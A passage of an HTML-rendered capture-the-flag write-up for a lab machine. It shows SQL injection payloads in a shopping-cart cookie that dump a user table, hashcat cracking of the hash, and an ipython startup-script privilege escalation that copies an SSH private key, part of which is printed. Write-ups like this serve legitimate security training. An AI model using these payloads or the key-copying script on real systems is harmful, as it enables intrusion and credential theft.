+<span class="w">            </span><span class="nt">&quot;support&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://github.com/PrestaShop/blockwishlist/tree/v2.0.1&quot;</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="nt">&quot;time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-05-27T15:29:15+00:00&quot;</span>
+<span class="w">        </span><span class="p">},</span>
+</pre></div>
+</div>
+<p>So so far we have a lot of information, and a lot of noise but the things potentially worth investigating are :</p>
+<ul class="simple">
+<li><p>PrestaShop 1.7</p></li>
+<li><p>PrestaShop blockwishlist 2.0.1</p></li>
+</ul>
+</section>
+<section id="blockwishlist-sqli">
+<h2>Blockwishlist sqli:<a class="headerlink" href="#blockwishlist-sqli" title="Permalink to this heading">#</a></h2>
+<p><a class="reference external" href="https://www.cybersecurity-help.cz/vdb/SB2022072609">https://www.cybersecurity-help.cz/vdb/SB2022072609</a><br />
+<a class="reference external" href="https://github.com/PrestaShop/blockwishlist/commit/b3ec4b85af5fd73f74d55390b226d221298ca084">https://github.com/PrestaShop/blockwishlist/commit/b3ec4b85af5fd73f74d55390b226d221298ca084</a></p>
+<p>According the the PR this was fixed in 2.1.1 so this might still be it:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>searchsploit<span class="w"> </span>blockwish
+-------------------------------------------------------------------------<span class="w"> </span>---------------------------------
+<span class="w"> </span>Exploit<span class="w"> </span>Title<span class="w">                                                           </span><span class="p">|</span><span class="w">  </span>Path
+-------------------------------------------------------------------------<span class="w"> </span>---------------------------------
+Prestashop<span class="w"> </span>blockwishlist<span class="w"> </span>module<span class="w"> </span><span class="m">2</span>.1.0<span class="w"> </span>-<span class="w"> </span>SQLi<span class="w">                             </span><span class="p">|</span><span class="w"> </span>php/webapps/51001.py
+-------------------------------------------------------------------------<span class="w"> </span>---------------------------------
+Shellcodes:<span class="w"> </span>No<span class="w"> </span>Results
+</pre></div>
+</div>
+<p>Making an account and starting to poke around with the wishlist, the actual cart in this implementation is sent to the checkout.shared.htb page through the <code class="docutils literal notranslate"><span class="pre">custom_cart</span></code> cookie, which we can tamper with.<br />
+Once url decoded the cookie looks like this:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">{</span><span class="s2">&quot;7DA8SKYP&quot;</span>:<span class="s2">&quot;1&quot;</span><span class="o">}</span><span class="w">             </span><span class="c1"># Normal cookie the id shows up in the checkout page under product</span>
+<span class="o">{</span><span class="s2">&quot;asdf&quot;</span>:<span class="s2">&quot;1&quot;</span><span class="o">}</span><span class="w">                 </span><span class="c1"># If we set a value that we know to be false, we see Not Found under product </span>
+<span class="o">{</span><span class="s2">&quot;asdf&#39; or 1=1 -- -&quot;</span>:<span class="s2">&quot;1&quot;</span><span class="o">}</span><span class="w">    </span><span class="c1"># we know asdf returns false so if injection is possible, this would be true, and it is (product 53GG2EF8)</span>
+</pre></div>
+</div>
+<p>Fit the query to the number of fields</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;asdf&#39; union select 1 -- -&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">}</span>     <span class="c1"># False </span>
+<span class="p">{</span><span class="s2">&quot;asdf&#39; union select 1,2 -- -&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">}</span>     <span class="c1"># False</span>
+<span class="p">{</span><span class="s2">&quot;asdf&#39; union select 1,2,3 -- -&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">}</span>     <span class="c1"># True as there are 3 fields</span>
+<span class="p">{</span><span class="s2">&quot;asdf&#39; union select 1,2,3,4 -- -&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">}</span>     <span class="c1"># False</span>
+</pre></div>
+</div>
+<p>Use the product id field (2) to concatenate and dump all table names from the information schema</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;asdf&#39; union select 1,(select group_concat(table_name separator &#39;|&#39;) from information_schema.tables),3 -- -&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">}</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ALL_PLUGINS<span class="p">|</span>APPLICABLE_ROLES<span class="p">|</span>CHARACTER_SETS<span class="p">|</span>CHECK_CONSTRAINTS<span class="p">|</span>COLLATIONS<span class="p">|</span>COLLATION_CHARACTER_SET_APPLICABILITY<span class="p">|</span>COLUMNS<span class="p">|</span>COLUMN_PRIVILEGES<span class="p">|</span>ENABLED_ROLES<span class="p">|</span>ENGINES<span class="p">|</span>EVENTS<span class="p">|</span>FILES<span class="p">|</span>GLOBAL_STATUS<span class="p">|</span>GLOBAL_VARIABLES<span class="p">|</span>KEYWORDS<span class="p">|</span>KEY_CACHES<span class="p">|</span>KEY_COLUMN_USAGE<span class="p">|</span>OPTIMIZER_TRACE<span class="p">|</span>PARAMETERS<span class="p">|</span>PARTITIONS<span class="p">|</span>PLUGINS<span class="p">|</span>PROCESSLIST<span class="p">|</span>PROFILING<span class="p">|</span>REFERENTIAL_CONSTRAINTS<span class="p">|</span>ROUTINES<span class="p">|</span>SCHEMATA<span class="p">|</span>SCHEMA_PRIVILEGES<span class="p">|</span>SESSION_STATUS<span class="p">|</span>SESSION_VARIABLES<span class="p">|</span>STATISTICS<span class="p">|</span>SQL_FUNCTIONS<span class="p">|</span>SYSTEM_VARIABLES<span class="p">|</span>TABLES<span class="p">|</span>TABLESPACES<span class="p">|</span>TABLE_CONSTRAINTS<span class="p">|</span>TABLE_PRIVILEGES<span class="p">|</span>TRIGGERS<span class="p">|</span>USER_PRIVILEGES<span class="p">|</span>VIEWS<span class="p">|</span>CLIENT_STATISTICS<span class="p">|</span>INDEX_STATISTICS<span class="p">|</span>INNODB_SYS_DATAFILES<span class="p">|</span>GEOMETRY_COLUMNS<span class="p">|</span>INNODB_SYS_TABLESTATS<span class="p">|</span>SPATIAL_REF_SYS<span class="p">|</span>INNODB_BUFFER_PAGE<span class="p">|</span>INNODB_TRX<span class="p">|</span>INNODB_CMP_PER_INDEX<span class="p">|</span>INNODB_METRICS<span class="p">|</span>INNODB_LOCK_WAITS<span class="p">|</span>INNODB_CMP<span class="p">|</span>THREAD_POOL_WAITS<span class="p">|</span>INNODB_CMP_RESET<span class="p">|</span>THREAD_POOL_QUEUES<span class="p">|</span>TABLE_STATISTICS<span class="p">|</span>INNODB_SYS_FIELDS<span class="p">|</span>INNODB_BUFFER_PAGE_LRU<span class="p">|</span>INNODB_LOCKS<span class="p">|</span>INNODB_FT_INDEX_TABLE<span class="p">|</span>INNODB_CMPMEM<span class="p">|</span>THREAD_POOL_GROUPS<span class="p">|</span>INNODB_CMP_PER_INDEX_RESET<span class="p">|</span>INNODB_SYS_FOREIGN_COLS<span class="p">|</span>INNODB_FT_INDEX_CACHE<span class="p">|</span>INNODB_BUFFER_POOL_STATS<span class="p">|</span>INNODB_FT_BEING_DELETED<span class="p">|</span>INNODB_SYS_FOREIGN<span class="p">|</span>INNODB_CMPMEM_RESET<span class="p">|</span>INNODB_FT_DEFAULT_STOPWORD<span class="p">|</span>INNODB_SYS_TABLES<span class="p">|</span>INNODB_SYS_COLUMNS<span class="p">|</span>INNODB_FT_CONFIG<span class="p">|</span>USER_STATISTICS<span class="p">|</span>INNODB_SYS_TABLESPACES<span class="p">|</span>INNODB_SYS_VIRTUAL<span class="p">|</span>INNODB_SYS_INDEXES<span class="p">|</span>INNODB_SYS_SEMAPHORE_WAITS<span class="p">|</span>INNODB_MUTEXES<span class="p">|</span>user_variables<span class="p">|</span>INNODB_TABLESPACES_ENCRYPTION<span class="p">|</span>INNODB_FT_DELETED<span class="p">|</span>THREAD_POOL_STATS<span class="p">|</span>user<span class="p">|</span>product
+</pre></div>
+</div>
+<p>Do the same thing to get all columns for the user table</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;asdf&#39; union select 1,(select group_concat(column_name separator &#39;|&#39;) from information_schema.columns where table_name=&#39;user&#39;),3-- -&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">}</span>
+</pre></div>
+</div>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">id</span><span class="o">|</span><span class="n">username</span><span class="o">|</span><span class="n">password</span>
+</pre></div>
+</div>
+<p>And finally dump the data we need</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;asdf&#39; union select 1,(select group_concat(concat(username,&#39;|&#39;,password) separator &#39;;&#39;) from user),3-- -&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">}</span>
+</pre></div>
+</div>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">james_mason</span><span class="o">|</span><span class="n">fc895d4eddc2fc12f995e18c865cf273</span>
+</pre></div>
+</div>
+</section>
+<section id="hash-cracking">
+<h2>Hash Cracking<a class="headerlink" href="#hash-cracking" title="Permalink to this heading">#</a></h2>
+<p>Thats 32 hex so possibly MD5</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;fc895d4eddc2fc12f995e18c865cf273&#39;</span><span class="p">|</span>wc<span class="w"> </span>-c
+<span class="m">32</span>
+</pre></div>
+</div>
+<p>Crackstation does it too, but here’s how to do it with hashcat</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>fc895d4eddc2fc12f995e18c865cf273<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w">                                     </span><span class="m">1</span><span class="w"> </span>⨯
+hashcat<span class="w"> </span><span class="o">(</span>v6.2.5<span class="o">)</span><span class="w"> </span>starting
+
+OpenCL<span class="w"> </span>API<span class="w"> </span><span class="o">(</span>OpenCL<span class="w"> </span><span class="m">3</span>.0<span class="w"> </span>PoCL<span class="w"> </span><span class="m">3</span>.0+debian<span class="w">  </span>Linux,<span class="w"> </span>None+Asserts,<span class="w"> </span>RELOC,<span class="w"> </span>LLVM<span class="w"> </span><span class="m">13</span>.0.1,<span class="w"> </span>SLEEF,<span class="w"> </span>POCL_DEBUG<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>Platform<span class="w"> </span><span class="c1">#1 [The pocl project]</span>
+<span class="o">====================================================================================================================================</span>
+*<span class="w"> </span>Device<span class="w"> </span><span class="c1">#1: pthread-0x000, 2914/5893 MB (1024 MB allocatable), 4MCU</span>
+
+Minimum<span class="w"> </span>password<span class="w"> </span>length<span class="w"> </span>supported<span class="w"> </span>by<span class="w"> </span>kernel:<span class="w"> </span><span class="m">0</span>
+Maximum<span class="w"> </span>password<span class="w"> </span>length<span class="w"> </span>supported<span class="w"> </span>by<span class="w"> </span>kernel:<span class="w"> </span><span class="m">256</span>
+
+Hashes:<span class="w"> </span><span class="m">1</span><span class="w"> </span>digests<span class="p">;</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>unique<span class="w"> </span>digests,<span class="w"> </span><span class="m">1</span><span class="w"> </span>unique<span class="w"> </span>salts
+Bitmaps:<span class="w"> </span><span class="m">16</span><span class="w"> </span>bits,<span class="w"> </span><span class="m">65536</span><span class="w"> </span>entries,<span class="w"> </span>0x0000ffff<span class="w"> </span>mask,<span class="w"> </span><span class="m">262144</span><span class="w"> </span>bytes,<span class="w"> </span><span class="m">5</span>/13<span class="w"> </span>rotates
+Rules:<span class="w"> </span><span class="m">1</span>
+
+Optimizers<span class="w"> </span>applied:
+*<span class="w"> </span>Zero-Byte
+*<span class="w"> </span>Early-Skip
+*<span class="w"> </span>Not-Salted
+*<span class="w"> </span>Not-Iterated
+*<span class="w"> </span>Single-Hash
+*<span class="w"> </span>Single-Salt
+*<span class="w"> </span>Raw-Hash
+
+ATTENTION!<span class="w"> </span>Pure<span class="w"> </span><span class="o">(</span>unoptimized<span class="o">)</span><span class="w"> </span>backend<span class="w"> </span>kernels<span class="w"> </span>selected.
+Pure<span class="w"> </span>kernels<span class="w"> </span>can<span class="w"> </span>crack<span class="w"> </span>longer<span class="w"> </span>passwords,<span class="w"> </span>but<span class="w"> </span>drastically<span class="w"> </span>reduce<span class="w"> </span>performance.
+If<span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span>switch<span class="w"> </span>to<span class="w"> </span>optimized<span class="w"> </span>kernels,<span class="w"> </span>append<span class="w"> </span>-O<span class="w"> </span>to<span class="w"> </span>your<span class="w"> </span>commandline.
+See<span class="w"> </span>the<span class="w"> </span>above<span class="w"> </span>message<span class="w"> </span>to<span class="w"> </span>find<span class="w"> </span>out<span class="w"> </span>about<span class="w"> </span>the<span class="w"> </span>exact<span class="w"> </span>limits.
+
+Watchdog:<span class="w"> </span>Hardware<span class="w"> </span>monitoring<span class="w"> </span>interface<span class="w"> </span>not<span class="w"> </span>found<span class="w"> </span>on<span class="w"> </span>your<span class="w"> </span>system.
+Watchdog:<span class="w"> </span>Temperature<span class="w"> </span>abort<span class="w"> </span>trigger<span class="w"> </span>disabled.
+
+Host<span class="w"> </span>memory<span class="w"> </span>required<span class="w"> </span><span class="k">for</span><span class="w"> </span>this<span class="w"> </span>attack:<span class="w"> </span><span class="m">1</span><span class="w"> </span>MB
+
+Dictionary<span class="w"> </span>cache<span class="w"> </span>hit:
+*<span class="w"> </span>Filename..:<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+*<span class="w"> </span>Passwords.:<span class="w"> </span><span class="m">14344385</span>
+*<span class="w"> </span>Bytes.....:<span class="w"> </span><span class="m">139921507</span>
+*<span class="w"> </span>Keyspace..:<span class="w"> </span><span class="m">14344385</span>
+
+fc895d4eddc2fc12f995e18c865cf273:Soleil101
+
+Session..........:<span class="w"> </span>hashcat
+Status...........:<span class="w"> </span>Cracked
+Hash.Mode........:<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">(</span>MD5<span class="o">)</span>
+Hash.Target......:<span class="w"> </span>fc895d4eddc2fc12f995e18c865cf273
+Time.Started.....:<span class="w"> </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:17:27<span class="w"> </span><span class="m">2022</span><span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>sec<span class="o">)</span>
+Time.Estimated...:<span class="w"> </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:17:28<span class="w"> </span><span class="m">2022</span><span class="w"> </span><span class="o">(</span><span class="m">0</span><span class="w"> </span>secs<span class="o">)</span>
+Kernel.Feature...:<span class="w"> </span>Pure<span class="w"> </span>Kernel
+Guess.Base.......:<span class="w"> </span>File<span class="w"> </span><span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......:<span class="w"> </span><span class="m">1</span>/1<span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span>
+Speed.#1.........:<span class="w">  </span><span class="m">6404</span>.7<span class="w"> </span>kH/s<span class="w"> </span><span class="o">(</span><span class="m">0</span>.10ms<span class="o">)</span><span class="w"> </span>@<span class="w"> </span>Accel:512<span class="w"> </span>Loops:1<span class="w"> </span>Thr:1<span class="w"> </span>Vec:4
+Recovered........:<span class="w"> </span><span class="m">1</span>/1<span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span><span class="w"> </span>Digests
+Progress.........:<span class="w"> </span><span class="m">2091008</span>/14344385<span class="w"> </span><span class="o">(</span><span class="m">14</span>.58%<span class="o">)</span>
+Rejected.........:<span class="w"> </span><span class="m">0</span>/2091008<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00%<span class="o">)</span>
+Restore.Point....:<span class="w"> </span><span class="m">2088960</span>/14344385<span class="w"> </span><span class="o">(</span><span class="m">14</span>.56%<span class="o">)</span>
+Restore.Sub.#1...:<span class="w"> </span>Salt:0<span class="w"> </span>Amplifier:0-1<span class="w"> </span>Iteration:0-1
+Candidate.Engine.:<span class="w"> </span>Device<span class="w"> </span>Generator
+Candidates.#1....:<span class="w"> </span>TEAMODARIO<span class="w"> </span>-&gt;<span class="w"> </span>Smudge77
+
+Started:<span class="w"> </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:17:26<span class="w"> </span><span class="m">2022</span>
+Stopped:<span class="w"> </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:17:29<span class="w"> </span><span class="m">2022</span>
+</pre></div>
+</div>
+<p>And this is a valid username:password for ssh</p>
+</section>
+<section id="privesc-from-james-to-dan">
+<h2>Privesc from james to dan<a class="headerlink" href="#privesc-from-james-to-dan" title="Permalink to this heading">#</a></h2>
+<p>Probing around to see what we can find, users with a shell are james root and dan, and the user flag is in dan</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>sh$<span class="w"> </span>/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
+dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
+</pre></div>
+</div>
+<p>There’s the mysql we already looted and something on port 6379</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>netstat<span class="w"> </span>-tulpen
+<span class="o">(</span>Not<span class="w"> </span>all<span class="w"> </span>processes<span class="w"> </span>could<span class="w"> </span>be<span class="w"> </span>identified,<span class="w"> </span>non-owned<span class="w"> </span>process<span class="w"> </span>info
+<span class="w"> </span>will<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>shown,<span class="w"> </span>you<span class="w"> </span>would<span class="w"> </span>have<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>root<span class="w"> </span>to<span class="w"> </span>see<span class="w"> </span>it<span class="w"> </span>all.<span class="o">)</span>
+Active<span class="w"> </span>Internet<span class="w"> </span>connections<span class="w"> </span><span class="o">(</span>only<span class="w"> </span>servers<span class="o">)</span>
+Proto<span class="w"> </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address<span class="w">           </span>Foreign<span class="w"> </span>Address<span class="w">         </span>State<span class="w">       </span>User<span class="w">       </span>Inode<span class="w">      </span>PID/Program<span class="w"> </span>name
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:3306<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">106</span><span class="w">        </span><span class="m">13494</span><span class="w">      </span>-
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:6379<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">284021</span><span class="w">     </span>-
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:80<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">13447</span><span class="w">      </span>-
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:22<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">12591</span><span class="w">      </span>-
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:443<span class="w">             </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">13448</span><span class="w">      </span>-
+tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::22<span class="w">                   </span>:::*<span class="w">                    </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">12593</span><span class="w">      </span>-
+udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:68<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">                           </span><span class="m">0</span><span class="w">          </span><span class="m">12476</span><span class="w">      </span>-
+</pre></div>
+</div>
+<p>That’s a redis instance</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span><span class="m">6379</span><span class="w"> </span>/etc/services
+redis<span class="w">           </span><span class="m">6379</span>/tcp
+</pre></div>
+</div>
+<p>We have already looted the MySQL database, but the password for it may be useful somewhere else</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>/var/www/checkout.shared.htb/config/db.php
+&lt;?php
+define<span class="o">(</span><span class="s1">&#39;DBHOST&#39;</span>,<span class="s1">&#39;localhost&#39;</span><span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span><span class="s1">&#39;DBUSER&#39;</span>,<span class="s1">&#39;checkout&#39;</span><span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span><span class="s1">&#39;DBPWD&#39;</span>,<span class="s1">&#39;a54$K_M4?DdT^HUk&#39;</span><span class="o">)</span><span class="p">;</span>
+define<span class="o">(</span><span class="s1">&#39;DBNAME&#39;</span>,<span class="s1">&#39;checkout&#39;</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</pre></div>
+</div>
+<p>Running pspy64 there’s a cronjob running /root/c.sh which does something with redis</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">2022</span>/10/16<span class="w"> </span><span class="m">19</span>:55:06<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">2137</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>perl<span class="w"> </span>-ne<span class="w"> </span>s/<span class="se">\(</span><span class="o">(</span><span class="se">\d</span>+<span class="o">)</span><span class="se">\)</span>/print<span class="w"> </span><span class="s2">&quot; </span><span class="nv">$1</span><span class="s2">&quot;</span>/ge
+<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">19</span>:55:06<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">2136</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span>/root/c.sh
+<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">19</span>:55:06<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">2135</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span>/root/c.sh
+<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">19</span>:55:06<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">2138</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>pidof<span class="w"> </span>redis-server
+<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">19</span>:55:06<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">2141</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>/sbin/init
+</pre></div>
+</div>
+<p>Another cronjob is killing ipython, moving to <code class="docutils literal notranslate"><span class="pre">/opt/scripts_review</span></code> and running ipython again</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">2022</span>/10/16<span class="w"> </span><span class="m">19</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">0</span><span class="w">    </span><span class="nv">PID</span><span class="o">=</span><span class="m">2151</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>/usr/sbin/CRON<span class="w"> </span>-f
+<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">19</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1001</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">2152</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span>/usr/bin/pkill<span class="w"> </span>ipython<span class="p">;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/opt/scripts_review/<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>/usr/local/bin/ipython
+<span class="m">2022</span>/10/16<span class="w"> </span><span class="m">19</span>:56:01<span class="w"> </span>CMD:<span class="w"> </span><span class="nv">UID</span><span class="o">=</span><span class="m">1001</span><span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="m">2153</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>/usr/bin/python3<span class="w"> </span>/usr/local/bin/ipython
+</pre></div>
+</div>
+<p>There’s a privesc for ipython as described here:<br />
+<a class="reference external" href="https://github.com/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/advisories/GHSA-pq7m-3gw7-gq5x</a></p>
+<p>So we can create a startup directory in there</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mkdir<span class="w"> </span>-m<span class="w"> </span><span class="m">777</span><span class="w"> </span>/opt/scripts_review/profile_default<span class="w"> </span>
+mkdir<span class="w"> </span>-m<span class="w"> </span><span class="m">777</span><span class="w"> </span>/opt/scripts_review/profile_default/startup
+</pre></div>
+</div>
+<p>And drop a simple python script that will copy dan’s key to tmp, as we have been able to observe that the .ssh folder exists for him</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/home/dan_smith/.ssh/id_rsa&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/tmp/dan_rsa&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>dan_rsa
+-----BEGIN<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
++/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ
+FwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku
+sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl
+4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx
+FHAVThRwfKb4Qh2l9rXGtK6G05+DXWj+OAe/Q34gCMgFG4h3mPw7tRz2plTRBQfgLcrvVD
+oQtePOEc/XuVff+kQH7PU9J1c0F/hC7gbklm2bA8YTNlnCQ2Z2Z+HSzeEXD5rXtCA69F4E
+u1FCodLROALNPgrAM4LgMbD3xaW5BqZWrm24uP/lAAAFiPY2n2r2Np9qAAAAB3NzaC1yc2
+EAAAGBAL1hZMxEMPbrCJp2e2QM3n5t+K/ueAvb248pjZeKcMTST2jUh23Vjvv/jj4dPyoj
+4O9BnWhVoYJvKhHxVyxF1G50jJIgeyWwt3wnwwhlGJqfUIokAtMYhXmkm72RcAODQmaLsw
+FtVv2V3utC2gF1QJRCG7hjlXDa1X4fl8lwxbxMq3uQVjQEUEmq1eQhl5OpLrI4m+VO73Sl
+...............................SNIP...................................
+2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTM
+wictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd/NHUGPnNasHiPjtN
+CRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6
+GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EY
